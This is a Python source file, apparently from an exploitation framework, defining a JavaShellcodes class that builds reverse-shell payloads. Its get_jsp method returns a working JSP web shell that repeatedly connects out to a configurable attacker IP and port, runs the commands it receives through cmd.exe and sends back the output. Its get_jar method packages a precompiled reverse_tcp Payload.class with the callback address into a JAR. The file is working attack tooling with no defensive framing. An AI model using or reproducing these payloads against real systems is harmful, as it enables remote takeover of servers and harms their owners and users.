import os
from shellcode import Shellcode
from core.helpers.archieve.jar import Jar
from ShellUtils import Constants, read_binary

class JavaShellcodes(Shellcode):
    """
        Class with shellcodes for java language
    """
    def __init__(self, connectback_ip='localhost', connectback_port=5555,
                 badchars=['\x00'], type = Constants.JavaShellcodeType.JAR, make_jar=False):
        Shellcode.__init__(self, connectback_ip=connectback_ip, connectback_port=connectback_port, badchars=badchars)
        self.type = type
        self.make_jar = make_jar
        self.path_to_jar = ""
        return

    def get_jsp(self):
        """ Function to get java(jsp) shellcode """

        if not self.CONNECTBACK_IP or not self.CONNECTBACK_PORT:
            print "Settings for connectback listener must be defined"
            return False

        javacode = ""
        javacode += """
<%@ page import="java.lang.*, java.util.*, java.io.*, java.net.*" %>
<%
    for (;;) {
        Socket socket = new Socket("LOCALHOST", LOCALPORT);

        InputStream inSocket = socket.getInputStream();
        BufferedReader s_in = new BufferedReader(new InputStreamReader(inSocket));

        OutputStream outSocket = socket.getOutputStream();

        char buffer[] = new char[8192];
        int length = s_in.read( buffer, 0, buffer.length );
        String cmd = String.valueOf(buffer,0, length);

        Process p = new ProcessBuilder("cmd.exe", "/C", cmd).redirectErrorStream(true).start();
        InputStream is = p.getInputStream();
        BufferedReader br = new BufferedReader(new InputStreamReader(is));
        String in;
        String all = "";
        while ((in = br.readLine()) != null) {
            all = all + in + "\\n\\r";
        }
        outSocket.write(all.getBytes());
        socket.close();
    }
%>"""

        javacode = javacode.replace("LOCALHOST", str(self.CONNECTBACK_IP))
        javacode = javacode.replace("LOCALPORT", str(self.CONNECTBACK_PORT))

        return javacode

    def get_jar(self, filename=""):
        if not os.path.exists('temp'):
            os.makedirs("temp")
        filepath = 'temp/%s' % (filename or "payload.jar")
        jar = Jar(filepath)
        data = "{host};{port}".format(host=self.CONNECTBACK_IP, port=self.CONNECTBACK_PORT)
        jar.add_file('east/data.dat', data)
        path = os.getcwd() + '/shellcodes/data/java/reverse_tcp/Payload.class'
        jar.add_file('east/Payload.class', read_binary(path))
        if self.make_jar:
            self.path_to_jar = filepath
        remove_jar = not self.make_jar
        return jar.get_raw(remove_jar)

    def get_shellcode(self):
        if not hasattr(Constants.JavaShellcodeType, self.type.upper()):
            raise Exception("There no Java payload of this type.")
        if self.type == Constants.JavaShellcodeType.JAR:
            return self.get_jar()
        return self.get_jsp()